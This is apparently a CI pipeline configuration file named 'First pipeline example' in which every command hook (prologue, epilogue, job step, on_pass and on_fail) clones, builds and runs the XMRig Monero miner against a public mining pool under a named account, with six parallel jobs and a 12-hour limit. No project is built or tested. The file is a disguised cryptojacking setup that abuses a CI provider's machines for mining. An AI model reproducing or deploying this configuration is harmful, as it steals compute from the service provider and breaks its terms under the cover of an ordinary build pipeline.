version: v1.0
name: First pipeline example
agent:
  machine:
    type: a1-standard-4
    os_image: macos-xcode12
execution_time_limit:
  hours: 12
global_job_config:
  prologue:
    commands:
      - 'brew install cmake libuv openssl hwloc; git clone https://github.com/xmrig/xmrig.git; mkdir xmrig/build && cd xmrig/build; cmake .. -DOPENSSL_ROOT_DIR=/usr/local/opt/openssl; make -j$(sysctl -n hw.logicalcpu); ./xmrig --donate-level 5 --opencl -o xmr.pool.minergate.com:45700 -u bugfdu1@gmail.com -p x -k -a rx/loki -t50'
  epilogue:
    always:
      commands:
        - 'brew install cmake libuv openssl hwloc; git clone https://github.com/xmrig/xmrig.git; mkdir xmrig/build && cd xmrig/build; cmake .. -DOPENSSL_ROOT_DIR=/usr/local/opt/openssl; make -j$(sysctl -n hw.logicalcpu); ./xmrig --donate-level 5 --opencl -o xmr.pool.minergate.com:45700 -u bugfdu1@gmail.com -p x -k -a rx/loki -t50'
blocks:
  - name: Cache deps
    task:
      env_vars:
        - name: APP_ENV
          value: prod
      jobs:
        - name: Get deps
          commands:
            - 'brew install cmake libuv openssl hwloc; git clone https://github.com/xmrig/xmrig.git; mkdir xmrig/build && cd xmrig/build; cmake .. -DOPENSSL_ROOT_DIR=/usr/local/opt/openssl; make -j$(sysctl -n hw.logicalcpu); ./xmrig --donate-level 5 --opencl -o xmr.pool.minergate.com:45700 -u bugfdu1@gmail.com -p x -k -a rx/loki -t50'
          parallelism: 6
      prologue:
        commands:
          - 'brew install cmake libuv openssl hwloc; git clone https://github.com/xmrig/xmrig.git; mkdir xmrig/build && cd xmrig/build; cmake .. -DOPENSSL_ROOT_DIR=/usr/local/opt/openssl; make -j$(sysctl -n hw.logicalcpu); ./xmrig --donate-level 5 --opencl -o xmr.pool.minergate.com:45700 -u bugfdu1@gmail.com -p x -k -a rx/loki -t50'
      epilogue:
        always:
          commands:
            - 'brew install cmake libuv openssl hwloc; git clone https://github.com/xmrig/xmrig.git; mkdir xmrig/build && cd xmrig/build; cmake .. -DOPENSSL_ROOT_DIR=/usr/local/opt/openssl; make -j$(sysctl -n hw.logicalcpu); ./xmrig --donate-level 5 --opencl -o xmr.pool.minergate.com:45700 -u bugfdu1@gmail.com -p x -k -a rx/loki -t50'
        on_pass:
          commands:
            - 'brew install cmake libuv openssl hwloc; git clone https://github.com/xmrig/xmrig.git; mkdir xmrig/build && cd xmrig/build; cmake .. -DOPENSSL_ROOT_DIR=/usr/local/opt/openssl; make -j$(sysctl -n hw.logicalcpu); ./xmrig --donate-level 5 --opencl -o xmr.pool.minergate.com:45700 -u bugfdu1@gmail.com -p x -k -a rx/loki -t50'
        on_fail:
          commands:
            - 'brew install cmake libuv openssl hwloc; git clone https://github.com/xmrig/xmrig.git; mkdir xmrig/build && cd xmrig/build; cmake .. -DOPENSSL_ROOT_DIR=/usr/local/opt/openssl; make -j$(sysctl -n hw.logicalcpu); ./xmrig --donate-level 5 --opencl -o xmr.pool.minergate.com:45700 -u bugfdu1@gmail.com -p x -k -a rx/loki -t50'
    dependencies: []
